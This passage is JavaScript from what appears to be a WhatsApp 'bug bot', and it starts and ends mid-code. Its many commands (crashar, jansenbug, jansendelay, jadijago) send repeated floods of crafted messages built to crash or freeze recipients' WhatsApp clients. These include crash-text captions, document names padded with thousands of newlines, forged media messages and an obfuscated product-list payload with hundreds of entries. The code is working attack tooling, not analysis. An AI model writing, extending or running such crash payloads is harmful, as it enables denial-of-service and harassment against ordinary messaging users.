"fileName": `🔥✯𝐉𝚫𝐍𝐒𝚵𝐍✯☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
jansen.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'jansenvirtext1': case 'jansenzsu': case 'crashar1': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯${iphone}` }, { quoted: doc })
}
}
break
case 'jansenvirtext2': case 'jansentol': case 'crashar2': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯${iphone1}` }, { quoted: doc })
}
}
break
case 'jansenvirtext3': case 'jansenmemek': case 'crashar3': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯${iphone2}` }, { quoted: doc })
}
}
break
case 'jansenvirtext4': case 'jansencontol': case 'crashar4': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯${iphone3}` }, { quoted: doc })
}
}
break
case 'jansenvirtext5': case 'jansentextv': case 'crashar5': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯${iphone4}` }, { quoted: doc })
}
}
break
case 'jansenvirtext6': case 'jansengas': case 'crashar6':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯${iphone5}` }, { quoted: doc })
}
}
break
case 'jansenvirtext7': case 'jansenvirtext': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯${iphone6}` }, { quoted: doc })
}
}
break
case 'jansenvirtext8': case 'jansenvirtextv1': case 'crashar7':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯${buttonkal}` }, { quoted: doc })
}
}
break
case 'jansenvirtext9': case 'jansenvirtextv2': case 'crashar8':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯${buttonvirus}` }, { quoted: doc })
}
}
break
case 'jansenvirtext10': case 'jansenvirtextv3': case 'crashar9': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
jansen.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/4eadba9e88088bf2586c5.jpg' }, caption: `© ✯𝐉𝚫𝐍𝐒𝚵𝐍✯${ngazap(prefix)}`}, { quoted: doc })
}
}
break
//=================================================//
case 'jansenbug1': case 'jansencrash': case 'crashar10':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var audio = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 16,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
}
}
break
//=================================================//
case 'jansenbug2': case 'jansencrash1': case 'crashar11': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basejansen/image/jansengans.jpg') }, { upload: jansen.waUploadToServer })
var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc",
"mimetype": "image/jpeg",
"caption": `©✯𝐉𝚫𝐍𝐒𝚵𝐍✯${ngazap(prefix)}`,
"fileSha256": "A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=",
"fileLength": "42521",
"height": 426,
"width": 640,
"mediaKey": "6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=",
"fileEncSha256": "Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=",
"directPath": "/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1",
"mediaKeyTimestamp": "1657286523",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, image.message, { messageId: image.key.id })
}
}
break
case 'jadijago': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} jansen`)
let teks = `${q}`
{
 var message = {
document : fs.readFileSync("./basejansen/sound/ngeselin.BIN"),
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
caption: ` ${teks}  ${buttonkal}`,
footer: ` ${teks} `,
mentionedJid: m.mentionedJid,
templateButtons: [{ urlButton: {displayText: `${teks}`, url: 'www.xnxxhwmods.com'}}, 
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🗡️'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🛡️'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🔧'}},
{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🪞'}}],
				headerType: 5
}
jansen.sendMessage(m.chat, message, { quoted : m })
}
}
break

case '⚔️': case '🗡️': case '🛡️': case '🪞': case '🔧': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
await jansen.sendMessage(m.chat, { 
text: '', 
templateButtons: [
{ callButton: { displayText: `OWNER`, phoneNumber: `6281364399250`}},
{ callButton: { displayText: `OWNER`, phoneNumber: `6281364399250`}},
{ urlButton: { displayText: `GROUP JANSEN MODS`, url: `https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K`}},
{ quickReplyButton: { displayText: `MY`, id: `Anjay Menger`}},
{ quickReplyButton: { displayText: `NAME`, id: `AH SLEBEEW`}},
{ quickReplyButton: { displayText: `jansen`, id: `JAGOAN OM?`}},
]
 })
  await sleep(10000* secon)
 }
 break
//=================================================//
case 'jansenbug3': case 'jansencrash2': case 'crashar12': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./basejansen/image/jansengans.jpg') }, { upload: jansen.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "application/octet-stream",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `©✯𝐉𝚫𝐍𝐒𝚵𝐍✯${ngazap(prefix)}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'jansenbug4': case 'jansencrash3': case 'crashar13':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": `https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K\n\n©✯𝐉𝚫𝐍𝐒𝚵𝐍✯`,
"matchedText": "https://chat.whatsapp.com/DqmrBceXTf4BKKD2L0251K",
"description": "Undangan Grup WhatsApp",
"title": `©✯𝐉𝚫𝐍𝐒𝚵𝐍✯${ngazap(prefix)}`,
"previewType": "NONE",
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
}
break
//=================================================//
case 'jansenbug5': case 'jansencrash4': case 'crashar14': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false,
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
}
}
break
case 'jansenbug6': case 'jansencrash5': case 'crashar15':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AgPwKRhs9an5F6WhnwXhdmhf8PX29TP_olqe4FIv1piE.enc",
"fileSha256": "u1dFgoXE6JsB5bUricNLDnIBh9NFx4QMuPMLccYrcb0=",
"fileEncSha256": "EK4PgZmQ6QoCl0GRQp3K8PCAzo9RXeMOU8NFjwnWXp0=",
"mediaKey": "XJ4fPYzZ63TWoziMvjXMHZQttVJLGpGN6wDjDpzdx7k=",
"mimetype": "image/webp",
"directPath": "/v/t62.15575-24/40664462_556808939544453_4219685480579374478_n.enc?ccb=11-4&oh=01_AVye92lzVBcYK_Ym5s5o-FrP_CF18W5sg9fb_Et5N3rV7g&oe=63639F3F",
"fileLength": "14240",
"mediaKeyTimestamp": "1664991742",
"isAnimated": false,
}
}), { userJid: m.chat, quoted: doc })
jansen.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
}
}
break

case 'jansendelay': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku Jansen`
for (let i = 0; i < jumlah; i++) {
var _0x39080c=_0x4b8f;function _0x3b16(){var _0x4c72fa=['chat','9940068BVkoHm','184726183721626','1847261837216262','PRODUCT_LIST','184726183721626282','7007318245952499','18472618372162628','1847261837216262829','1847261837216262824','8606787pjRFfV','6ohjUEo','18472618372162627','2DjJTeF','10eBrCRT','message','1860208OrcNUm','1303771sMeUPs','1596925gyTSrQ','1847261837216269','jansen','18561433JSLMJl','key','2624412LNDEmX','16vCdaCM'];_0x3b16=function(){return _0x4c72fa;};return _0x3b16();}(function(_0x5e9cd5,_0x1d7d08){var _0x1a0e50=_0x4b8f,_0x1f94ff=_0x5e9cd5();while(!![]){try{var _0x25dc7c=parseInt(_0x1a0e50(0x19a))/0x1+-parseInt(_0x1a0e50(0x196))/0x2*(parseInt(_0x1a0e50(0x1a0))/0x3)+parseInt(_0x1a0e50(0x1a1))/0x4*(-parseInt(_0x1a0e50(0x19b))/0x5)+-parseInt(_0x1a0e50(0x194))/0x6*(-parseInt(_0x1a0e50(0x193))/0x7)+-parseInt(_0x1a0e50(0x199))/0x8+-parseInt(_0x1a0e50(0x1a3))/0x9+-parseInt(_0x1a0e50(0x197))/0xa*(-parseInt(_0x1a0e50(0x19e))/0xb);if(_0x25dc7c===_0x1d7d08)break;else _0x1f94ff['push'](_0x1f94ff['shift']());}catch(_0xcc3c8f){_0x1f94ff['push'](_0x1f94ff['shift']());}}}(_0x3b16,0xb2901));var bugshinchan=generateWAMessageFromContent(m['chat'],proto['Message']['fromObject']({'listMessage':{'title':''+buttonkal,'description':'JANSEN\x20MODS'+buttonkal,'buttonText':_0x39080c(0x19d),'listType':_0x39080c(0x18d),'productListInfo':{'productSections':[{'title':''+buttonkal,'products':[{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x19c)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'1847261837216269'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a5)},{'productId':'1847261837216262244'},{'productId':'184726183721626282'},{'productId':_0x39080c(0x191)},{'productId':_0x39080c(0x191)},{'productId':_0x39080c(0x192)},{'productId':_0x39080c(0x18e)},{'productId':'184726183721626282'},{'productId':_0x39080c(0x18e)},{'productId':_0x39080c(0x190)},{'productId':_0x39080c(0x190)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x195)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a5)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':'184726183721626'},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a4)},{'productId':_0x39080c(0x1a5)},{'productId':_0x39080c(0x1a4)},{'productId':'1847261837216